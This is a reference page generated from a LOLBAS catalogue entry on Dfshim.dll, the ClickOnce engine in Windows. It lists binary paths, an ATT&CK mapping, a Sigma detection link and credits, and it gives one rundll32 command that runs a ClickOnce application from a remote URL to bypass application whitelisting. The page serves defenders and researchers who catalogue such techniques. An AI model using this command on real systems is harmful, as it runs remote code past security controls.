---
title: "Dfshim.dll"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/Dfshim.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Dfshim.yml"
build_date: "2026-04-27 19:14:21"
category: "OSLibraries"
aliases:
  - "Dfshim.dll"
functions:
  - "AWL Bypass"
attack_technique_ids:
  - "T1127.002"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

ClickOnce engine in Windows used by .NET

## Paths

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`

## Commands

### 1. AWL Bypass

Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)

```cmd
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

- Use Case: Use binary to bypass Application whitelisting
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution#^t1127002-clickonce|T1127.002: ClickOnce]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml

## Resources

- {'Link': 'https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf'}
- {'Link': 'https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Dfshim.yml)
